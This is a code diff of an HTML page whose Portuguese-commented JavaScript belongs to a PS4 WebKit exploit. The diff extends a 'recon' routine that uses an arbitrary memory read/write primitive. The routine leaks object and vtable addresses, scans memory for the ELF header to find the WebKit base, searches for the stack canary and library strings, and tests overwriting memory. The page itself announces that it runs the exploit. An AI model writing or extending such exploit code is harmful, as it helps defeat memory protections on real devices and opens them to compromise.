@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
@@ -95,6 +96,17 @@
     log(`${tag}: ${detail}`, "info");
   }
 
+  // ========== UTILS ==========
+  function readString(p, addr, maxLen = 256) {
+    let s = "";
+    for (let i = 0; i < maxLen; i++) {
+      let b = p.read1(addr.add32(i));
+      if (b === 0) break;
+      s += String.fromCharCode(b);
+    }
+    return s;
+  }
+
   // ========== RECONHECIMENTO PS4 ==========
   window.reconPS4 = async function() {
     const p = window.p;
@@ -105,59 +117,92 @@
     log("=== INICIANDO RECON PS4 ===", "ok");
 
     try {
+      // 0. User-Agent = firmware hint
+      let ua = navigator.userAgent;
+      log(`User-Agent: ${ua}`, "info");
+
       // 1. Leak textarea
       let textarea = document.createElement("textarea");
       let textAddr = p.leakval(textarea);
       log(`textarea object @ 0x${textAddr.toString(16)}`, "info");
 
-      // 2. Vtable pointer (offset +0x18 no PS4 WebKit)
+      // 2. Vtable pointer (offset +0x18)
       let vtablePtr = p.read8(textAddr.add32(0x18));
       log(`vtable ptr @ 0x${vtablePtr.toString(16)}`, "info");
 
       // 3. Primeiro entry do vtable
       let firstEntry = p.read8(vtablePtr);
       log(`first vtable entry @ 0x${firstEntry.toString(16)}`, "info");
-      log(`  (low=0x${firstEntry.low.toString(16)}, hi=0x${firstEntry.hi.toString(16)})`, "info");
 
-      // 4. Alinhar para baixo em 0x1000 para guess da base
-      let pageOffset = firstEntry.low & 0xFFF;
-      let webkitBaseGuess = firstEntry.sub32(pageOffset);
-      log(`WebKit base (guess, 0x1000 aligned) ~ 0x${webkitBaseGuess.toString(16)}`, "warn");
-
-      // 5. Sanity check: ler magic bytes
-      let magic = p.read4(webkitBaseGuess);
-      let magicHex = "0x" + magic.toString(16).padStart(8, '0');
-      log(`Magic at guessed base: ${magicHex}`, "info");
-
-      if (magicHex === "0x464c457f") {
-        log("ELF magic detectado! Base provavelmente correta.", "ok");
-      } else if (magicHex === "0xfeedfacf" || magicHex === "0xfeedface") {
-        log("Mach-O magic detectado! Base provavelmente correta.", "ok");
-      } else {
-        log("Magic não reconhecido. Ajuste o offset do vtable manualmente.", "warn");
-      }
-
-      // 6. Tentar achar __stack_chk_guard via scan simples
-      //    (procurar padrão conhecido na memória do WebKit)
-      log("Iniciando scan por __stack_chk_guard...", "info");
-      let foundGuard = false;
-      for (let off = 0; off < 0x200000; off += 0x1000) {
+      // 4. Scan reverso a partir do first entry procurando ELF header
+      //    PS4 usa paginas de 16KB (0x4000)
+      log("Scanning for ELF header (0x4000 aligned)...", "info");
+      let elfBase = null;
+      let scanStart = firstEntry.and64(0xFFFFC000, 0xFFFFFFFF); // align down 0x4000
+      for (let i = 0; i < 0x100; i++) {
+        let candidate = scanStart.sub32(i * 0x4000);
         try {
-          let candidate = webkitBaseGuess.add32(off);
-          let val = p.read8(candidate);
-          // __stack_chk_guard geralmente tem os 3 bytes superiores zerados e LSB != 0
-          if (val.hi === 0 && val.low !== 0 && (val.low & 0xFF000000) !== 0) {
-            log(`Possível __stack_chk_guard @ base+0x${off.toString(16)} = 0x${val.toString(16)}`, "info");
-            foundGuard = true;
+          let magic = p.read4(candidate);
+          if (magic === 0x464c457f) { // \x7fELF
+            elfBase = candidate;
+            log(`ELF header found @ 0x${candidate.toString(16)}`, "ok");
             break;
           }
         } catch (e) {}
       }
-      if (!foundGuard) {
-        log("__stack_chk_guard não encontrado no scan rápido.", "warn");
+
+      if (!elfBase) {
+        log("ELF header not found near vtable. Trying 0x1000 alignment...", "warn");
+        scanStart = firstEntry.and64(0xFFFFF000, 0xFFFFFFFF);
+        for (let i = 0; i < 0x400; i++) {
+          let candidate = scanStart.sub32(i * 0x1000);
+          try {
+            let magic = p.read4(candidate);
+            if (magic === 0x464c457f) {
+              elfBase = candidate;
+              log(`ELF header found (0x1000) @ 0x${candidate.toString(16)}`, "ok");
+              break;
+            }
+          } catch (e) {}
+        }
       }
 
-      // 7. Leak de alguns objetos no heap para mapear o layout
+      if (!elfBase) {
+        log("Could not find ELF header. Manual calibration needed.", "err");
+      } else {
+        // 5. Ler e_ident para confirmar
+        let eiClass = p.read1(elfBase.add32(4));
+        let eiData = p.read1(elfBase.add32(5));
+        log(`ELF class=${eiClass} data=${eiData} (1=32bit,2=64bit | 1=little,2=big)`, "info");
+
+        // 6. Tentar achar __stack_chk_guard no BSS do ELF
+        //    Heuristica: ler um pouco acima da base procurando ponteiro com hi baixo
+        log("Scanning for __stack_chk_guard near base...", "info");
+        for (let off = 0x1000; off < 0x200000; off += 8) {
+          try {
+            let val = p.read8(elfBase.add32(off));
+            // __stack_chk_guard: geralmente hi=0, low != 0, e low > 0x1000
+            if (val.hi === 0 && val.low > 0x1000 && (val.low & 0xFFF) === 0) {
+              log(`Possible __stack_chk_guard @ base+0x${off.toString(16)} = 0x${val.toString(16)}`, "info");
+              break;
+            }
+          } catch (e) {}
+        }
+
+        // 7. Procurar por ponteiros de import (GOT)
+        //    Procurar por strings "libkernel" ou "libSceLibcInternal" no ELF
+        log("Scanning for module strings...", "info");
+        for (let off = 0; off < 0x400000; off += 0x1000) {
+          try {
+            let s = readString(p, elfBase.add32(off), 32);
+            if (s.includes("libkernel") || s.includes("libc")) {
+              log(`String found @ base+0x${off.toString(16)}: "${s}"`, "ok");
+            }
+          } catch (e) {}
+        }
+      }
+
+      // 8. Heap samples
       log("Heap sample (5 arrays):", "info");
       for (let i = 0; i < 5; i++) {
         let arr = new Uint8Array(0x100);
@@ -165,18 +210,20 @@
         log(`  Array[${i}] @ 0x${addr.toString(16)}`, "info");
       }
 
-      // 8. Testar read/write rápido
-      log("Testando read/write no primitivo...", "info");
+      // 9. RW sanity
+      log("Testing read/write...", "info");
       let testBuf = new Uint8Array(8);
       let testAddr = p.leakval(testBuf);
-      let original = p.read8(testAddr.add32(0x10)); // m_vector offset
+      let original = p.read8(testAddr.add32(0x10));
       p.write8(testAddr.add32(0x10), new int64(0x41414141, 0x42424242));
       let modified = p.read8(testAddr.add32(0x10));
-      p.write8(testAddr.add32(0x10), original); // restaurar
-      log(`  RW test: original=0x${original.toString(16)} modified=0x${modified.toString(16)}`, "ok");
+      p.write8(testAddr.add32(0x10), original);
+      log(`  RW test OK: original=0x${original.toString(16)} modified=0x${modified.toString(16)}`, "ok");
 
       log("=== RECON FINALIZADO ===", "ok");
-      log("Próximo: informe o first vtable entry para calibrar offsets exatos.", "warn");
+      if (!elfBase) {
+        log("Dica: informe o first vtable entry e o firmware para calibrar offsets.", "warn");
+      }
 
     } catch (e) {
       log(`ERRO no recon: ${e.name}: ${e.message}`, "err");
@@ -186,7 +233,7 @@
 
   btnRecon.onclick = window.reconPS4;
 
-  // ========== BOOTSTRAP DO EXPLOIT ==========
+  // ========== BOOTSTRAP ==========
   log("Carregando módulos...", "ok");
   status.textContent = "Executando exploit...";
 
@@ -205,7 +252,7 @@
 
       window.__carrier = carrier;
       window.__prim = prim;
-      window.int64 = int64; // expor para uso manual no console
+      window.int64 = int64;
 
       status.textContent = "RW Primitivo OK — Pronto para Recon";
       status.style.color = "#4ade80";
